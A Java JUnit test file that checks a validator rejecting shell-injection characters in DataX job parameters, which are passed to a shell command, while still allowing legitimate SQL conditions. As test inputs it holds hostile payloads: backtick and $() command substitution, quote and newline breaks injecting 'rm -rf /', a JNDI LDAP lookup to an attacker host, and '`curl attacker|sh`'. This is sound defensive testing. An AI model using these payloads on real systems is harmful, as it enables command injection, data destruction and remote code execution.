package com.wugui.datatx.core.util;

import com.wugui.datatx.core.biz.model.TriggerParam;
import org.junit.Assert;
import org.junit.Test;

/**
 * 批次 10-F：作业参数是命令行片段，不是数据。
 *
 * 执行器把它们拼成 <code>-j"..." -p"..."</code> 交给 datax.py，而 datax.py 收尾是
 * <code>subprocess.Popen(startCommand, shell=True)</code>。本类钉两件事：
 *   1) 双引号内依旧生效的 shell 字符（引号、反引号、$、反斜杠）和换行必须被拒；
 *   2) 合法写法必须放行 —— 尤其 WHERE 条件里常见的 <code>&gt; &lt; ; ( ) %s</code>，
 *      守卫把这些一并禁掉就等于把功能修坏了。
 */
public class JobParamSafetyTest {

    private static String deny(String jvmParam, String replaceParam,
                               String replaceParamType, String partitionInfo) {
        return JobParamSafety.denyMessage(jvmParam, replaceParam, replaceParamType, partitionInfo);
    }

    // ---------------- 拒绝：双引号内仍能闭合或起作用的字符 ----------------

    @Test
    public void rejectsBacktickCommandSubstitutionInJvmParam() {
        String message = deny("-Xmx1g `touch /tmp/pwned`", null, null, null);
        Assert.assertNotNull("反引号在双引号内依旧会执行命令替换，必须拒收", message);
        Assert.assertTrue(message, message.contains("JVM 参数"));
        Assert.assertTrue(message, message.contains("反引号"));
        assertDoesNotEchoPayload(message);
    }

    @Test
    public void rejectsDollarCommandSubstitutionInJvmParam() {
        String message = deny("-Xms$(id)g", null, null, null);
        Assert.assertNotNull("$( ) 是命令替换，必须拒收", message);
        Assert.assertTrue(message, message.contains("美元符"));
        assertDoesNotEchoPayload(message);
    }

    @Test
    public void rejectsQuoteThatClosesTheArgument() {
        // 闭合掉 -j"..." 之后，后面的内容就是裸命令行
        String message = deny("-Xmx1g\" ; rm -rf / ; \"", null, null, null);
        Assert.assertNotNull(message);
        Assert.assertTrue(message, message.contains("双引号"));
    }

    @Test
    public void rejectsBackslashEscape() {
        // 反斜杠专门用来绕过上面几个字符的过滤，留下它=过滤形同虚设
        String message = deny("-Xmx1g \\`id\\`", null, null, null);
        Assert.assertNotNull(message);
        Assert.assertTrue(message, message.contains("反斜杠"));
    }

    @Test
    public void rejectsNewlineWhichEndsTheCommandLine() {
        String message = deny("-Xmx1g\nrm -rf /", null, null, null);
        Assert.assertNotNull(message);
        Assert.assertTrue(message, message.contains("换行符"));
    }

    @Test
    public void rejectsShellCharsInAnyPartitionSegment() {
        // 三段最终拼成 -p"-Dpartition=<字段>=<日期>"，字段名同样是命令行片段
        String message = deny(null, null, null, "dt`id`,-1,yyyyMMdd");
        Assert.assertNotNull("分区字段名带反引号同样会被拼进命令行", message);
        Assert.assertTrue(message, message.contains("分区信息的分区字段"));
    }

    @Test
    public void rejectsInjectionInReplaceParam() {
        String message = deny(null, "-Did=${jndi:ldap://attacker/a}", null, null);
        Assert.assertNotNull(message);
        Assert.assertTrue(message, message.contains("增量替换参数"));
    }

    /** 拒绝文案只报字符类型，不能把用户原文回显出去（响应体本身又是一次渲染入口） */
    private static void assertDoesNotEchoPayload(String message) {
        Assert.assertFalse(message, message.contains("`"));
        Assert.assertFalse(message, message.contains("$"));
        Assert.assertFalse(message, message.contains("\\"));
    }

    // ---------------- 放行：合法写法不能被误杀 ----------------

    @Test
    public void allowsBlankParams() {
        Assert.assertNull(deny(null, null, null, null));
        Assert.assertNull(deny("", "   ", "", "  "));
    }

    @Test
    public void allowsOrdinaryJvmFlags() {
        Assert.assertNull(deny("-Xms1g -Xmx2g -Dfile.encoding=UTF-8", null, null, null));
    }

    @Test
    public void allowsWhereClauseMetacharacters() {
        // 这些在 shell 的双引号里是普通字面量；禁掉它们就是把用户的增量条件写不成
        Assert.assertNull(deny(null, "-DstartId=id>=%s and id<=%s", null, null));
        Assert.assertNull(deny(null, "-Dwhere=(a>=%s)&(b<=%s)", null, null));
    }

    @Test
    public void allowsWellFormedPartitionInfo() {
        Assert.assertNull(deny(null, null, null, "dt,-1,yyyyMMdd"));
        Assert.assertNull(deny(null, null, null, "ds , 0 , yyyy-MM-dd HH:mm:ss"));
    }

    @Test
    public void allowsTimestampAsTimeFormat() {
        // "Timestamp" 走毫秒时间戳分支，不是日期样式；比较方式照抄 BuildCommand
        Assert.assertNull(deny(null, "-Dstart=%s", "Timestamp", null));
        Assert.assertNull(deny(null, "-Dstart=%s", null, null));
    }

    // ---------------- 分区信息/时间格式的结构错误：报错不能等到执行器 ----------------

    @Test
    public void rejectsPartitionInfoWithWrongSegmentCount() {
        String message = deny(null, null, null, "dt,-1");
        Assert.assertNotNull(message);
        Assert.assertTrue(message, message.contains("2 段"));
    }

    @Test
    public void rejectsPartitionInfoWithBlankSegment() {
        String message = deny(null, null, null, "dt,,yyyyMMdd");
        Assert.assertNotNull(message);
        Assert.assertTrue(message, message.contains("天数偏移为空"));
    }

    @Test
    public void rejectsNonNumericDayOffset() {
        String message = deny(null, null, null, "dt,yesterday,yyyyMMdd");
        Assert.assertNotNull(message);
        Assert.assertTrue(message, message.contains("必须是整数"));
    }

    @Test
    public void rejectsUnparseablePartitionDateFormat() {
        // 执行器会拿它 new SimpleDateFormat(...)，非法样式在执行器线程抛 IllegalArgumentException
        String message = deny(null, null, null, "dt,-1,timestamp");
        Assert.assertNotNull(message);
        Assert.assertTrue(message, message.contains("分区信息的日期格式"));
    }

    @Test
    public void rejectsUnparseableReplaceParamType() {
        // 't' 不是 SimpleDateFormat 的样式字母，执行器拿它去 new SimpleDateFormat 会直接抛
        String message = deny(null, "-Dstart=%s", "yyyy-MM-dd-tt", null);
        Assert.assertNotNull(message);
        Assert.assertTrue(message, message.contains("增量时间格式"));
    }

    // ---------------- TriggerParam 入口（执行器侧用的就是这个重载） ----------------

    @Test
    public void triggerParamOverloadChecksTheSameFourFields() {
        TriggerParam clean = new TriggerParam();
        clean.setJvmParam("-Xmx1g");
        clean.setReplaceParam("-Did>=%s");
        clean.setReplaceParamType("Timestamp");
        clean.setPartitionInfo("dt,-1,yyyyMMdd");
        Assert.assertNull(JobParamSafety.denyMessage(clean));

        TriggerParam dirty = new TriggerParam();
        dirty.setPartitionInfo("dt,-1,yyyyMMdd");
        dirty.setReplaceParam("`curl attacker|sh`");
        String message = JobParamSafety.denyMessage(dirty);
        Assert.assertNotNull(message);
        Assert.assertTrue(message, message.contains("增量替换参数"));
        Assert.assertNull(JobParamSafety.denyMessage((TriggerParam) null));
    }
}
